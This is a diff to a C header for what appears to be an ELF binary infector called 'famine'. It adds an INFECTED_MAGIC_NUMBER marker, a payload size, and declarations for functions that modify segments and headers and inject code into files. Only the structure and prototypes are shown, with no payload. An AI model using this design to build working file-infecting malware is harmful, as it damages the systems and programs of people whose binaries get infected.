@@ -22,7 +22,9 @@
 
 #define ELF_MAGIC_SIZE 4
 #define ELF_MAGIC_NUMBER 1179403647
-#define PACK_MAGIC_NUMBER 0x15D25
+#define INFECTED_MAGIC_NUMBER 0x15D25
+
+#define PAYLOAD_SIZE 708
 
 #define X86_64 2
 
@@ -32,7 +34,6 @@
 #define BUFF_SIZE 1024*1024*5
 
 #define VOID __attribute__((unused))
-
 
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
@@ -58,20 +59,18 @@ struct elf
 {
 	void *ptr;
 	unsigned long long size;
-	unsigned long long old_entrypoint;
 
-	unsigned long long segment_offset;
-	unsigned long long segment_addr;
-	unsigned long long segment_size;
+	Elf64_Ehdr *header;
+	Elf64_Phdr *note;
+	Elf64_Phdr *data;
 
-	unsigned long long section_offset;
-	unsigned long long section_addr;
-	unsigned long long section_size;
+	int addr_padding;
+	int offs_padding;
 };
 
 struct criteria
 {
-	bool (*f)(const struct elf *file);
+	bool (*f)(const Elf64_Ehdr *header);
 };
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -83,6 +82,15 @@ void famine(struct directory *dir);
 
 // INFECT_C
 __attribute__((hot)) void infect_file(const char *filename);
+
+// SEGMENTS_C
+void modify_segments(struct elf *file);
+
+// HEADER_C
+void modify_header(struct elf *file);
+
+// INJECT_C
+void inject(const struct elf *file);
 
 // FILE_C
 struct elf get_file(const char *str);
@@ -100,5 +108,7 @@ int _munmap(void *addr, unsigned long length);
 // UTILS_C
 unsigned long _strlen(const char *str);
 void _bzero(char *str, const unsigned long index);
+int _strcmp(const char *s1, const char *s2);
+
 
 #endif
